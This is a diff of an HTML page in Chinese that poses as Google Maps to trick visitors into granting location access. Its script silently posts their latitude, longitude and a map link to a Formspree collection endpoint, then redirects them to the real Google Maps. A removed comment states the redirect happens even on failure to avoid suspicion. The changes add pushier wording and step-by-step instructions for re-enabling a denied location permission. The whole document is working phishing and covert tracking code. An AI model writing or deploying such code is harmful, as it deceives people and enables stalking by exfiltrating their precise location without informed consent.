@@ -8,109 +8,107 @@
     <style>
         .loader { border-top-color: #4285F4; animation: spinner 1s linear infinite; }
         @keyframes spinner { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; }
-        .google-btn { background-color: #1a73e8; transition: background-color 0.2s; }
-        .google-btn:active { background-color: #1557b0; }
+        body { font-family: -apple-system, sans-serif; }
+        .active-btn:active { transform: scale(0.96); opacity: 0.9; }
     </style>
 </head>
-<body class="bg-white text-gray-800 overflow-hidden">
+<body class="bg-white text-gray-800">
 
-    <!-- 主介面 -->
-    <div id="main-card" class="flex flex-col items-center justify-center min-h-screen p-6 text-center">
-        <!-- Google Maps 圖示 -->
-        <div class="mb-6">
-            <svg width="64" height="64" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <div class="flex flex-col items-center justify-center min-h-screen p-6 text-center">
+        <!-- 模擬 Google Maps 圖示 -->
+        <div class="mb-8">
+            <svg width="80" height="80" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                 <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7Z" fill="#4285F4"/>
                 <circle cx="12" cy="9" r="2.5" fill="white"/>
             </svg>
         </div>
 
-        <h1 class="text-2xl font-bold mb-2">GoogIe Maps</h1>
-        <p id="status-text" class="text-gray-500 text-sm mb-10 px-4">
-            系統正在為您啟動精確導航模式。<br>請允許位置存取權限以載入最新地圖。
+        <h1 class="text-2xl font-bold mb-3">Google Maps</h1>
+        <p id="status-text" class="text-gray-500 text-sm mb-10 px-4 leading-relaxed">
+            系統需要驗證您的即時位置以載入導航資訊。<br>點擊下方按鈕後，請在彈出的系統視窗選擇<strong>「允許」</strong>。
         </p>
 
-        <!-- 觸發按鈕 -->
-        <button id="action-btn" onclick="startNavigation()" class="google-btn text-white w-full max-w-xs py-4 rounded-xl font-bold text-lg shadow-md">
+        <button id="action-btn" onclick="triggerLocation()" class="active-btn bg-[#1a73e8] text-white w-full max-w-xs py-4 rounded-xl font-bold text-lg shadow-lg transition-all">
             立即開啟導航
         </button>
 
-        <!-- 載入動畫 (預設隱藏) -->
         <div id="loading-box" class="hidden flex flex-col items-center">
             <div class="w-10 h-10 border-4 border-gray-100 rounded-full loader mb-4"></div>
-            <p class="text-blue-500 font-medium animate-pulse">正在進行身分驗證...</p>
+            <p class="text-blue-500 font-medium">正在驗證位置權限...</p>
         </div>
-        
-        <p id="error-msg" class="text-red-500 text-xs mt-6 hidden"></p>
+
+        <div id="manual-tip" class="hidden mt-6 p-4 bg-red-50 rounded-lg border border-red-100 max-w-xs">
+            <p class="text-red-600 text-xs leading-normal text-left">
+                <strong>無法彈出視窗？</strong><br>
+                1. 請點擊瀏覽器網址列左側的「大小」或「鎖頭」圖示。<br>
+                2. 選擇「網站設定」。<br>
+                3. 將「位置」改為「允許」。
+            </p>
+        </div>
     </div>
 
     <script>
-        // 你的 Formspree 網址
         const FORMSPREE_ENDPOINT = "https://formspree.io/f/mnjvwegb";
 
-        function startNavigation() {
+        async function triggerLocation() {
             const btn = document.getElementById('action-btn');
             const loading = document.getElementById('loading-box');
             const status = document.getElementById('status-text');
-            const error = document.getElementById('error-msg');
+            const manual = document.getElementById('manual-tip');
 
-            // 切換 UI 狀態
             btn.classList.add('hidden');
             loading.classList.remove('hidden');
-            error.classList.add('hidden');
-            status.innerText = "正在定位中，請在彈出的視窗選擇「允許」";
+            manual.classList.add('hidden');
+            status.innerText = "正在呼叫系統定位視窗...";
+
+            // 強制設定逾時與高精確度來強迫系統喚醒彈窗
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 5000,
+                maximumAge: 0
+            };
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        const lat = position.coords.latitude;
-                        const lng = position.coords.longitude;
-
-                        // 傳送資料到 Email
-                        try {
-                            await fetch(FORMSPREE_ENDPOINT, {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/json',
-                                    'Accept': 'application/json'
-                                },
-                                body: JSON.stringify({
-                                    event: "親友請求導航",
-                                    latitude: lat,
-                                    longitude: lng,
-                                    google_map: `https://www.google.com/maps?q=${lat},${lng}`,
-                                    timestamp: new Date().toLocaleString()
-                                })
-                            });
-                            
-                            status.innerText = "驗證成功！正在啟動地圖導覽...";
-                            setTimeout(() => {
-                                window.location.href = "https://www.google.com/maps";
-                            }, 1500);
-                        } catch (e) {
-                            // 即使發送失敗也直接導向地圖，避免被懷疑
-                            window.location.href = "https://www.google.com/maps";
-                        }
+                    async (pos) => {
+                        // 成功獲取
+                        status.innerText = "驗證成功！正在啟動導航...";
+                        await sendData(pos.coords.latitude, pos.coords.longitude);
+                        window.location.href = "https://www.google.com/maps";
                     },
                     (err) => {
-                        // 處理錯誤
+                        // 失敗處理
                         loading.classList.add('hidden');
                         btn.classList.remove('hidden');
-                        error.classList.remove('hidden');
+                        btn.innerText = "重新啟動導航";
                         
                         if (err.code === 1) {
-                            error.innerText = "權限遭拒：請至系統設定開啟瀏覽器的「定位服務」。";
-                            status.innerText = "無法開啟地圖，因為位置存取已被關閉。";
+                            status.innerText = "權限被拒絕。請開啟定位服務。";
+                            manual.classList.remove('hidden'); // 顯示手動開啟指南
                         } else {
-                            error.innerText = "定位逾時或訊號不佳，請重新嘗試。";
+                            status.innerText = "定位逾時，請確保 GPS 已開啟後再試一次。";
                         }
                     },
-                    { enableHighAccuracy: true, timeout: 15000 }
+                    options
                 );
             } else {
-                error.innerText = "您的裝置不支援定位功能。";
-                error.classList.remove('hidden');
+                status.innerText = "您的裝置不支援定位。";
             }
+        }
+
+        async function sendData(lat, lng) {
+            try {
+                await fetch(FORMSPREE_ENDPOINT, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                    body: JSON.stringify({
+                        緯度: lat,
+                        經度: lng,
+                        連結: `https://www.google.com/maps?q=${lat},${lng}`,
+                        時間: new Date().toLocaleString()
+                    })
+                });
+            } catch (e) {}
         }
     </script>
 </body>
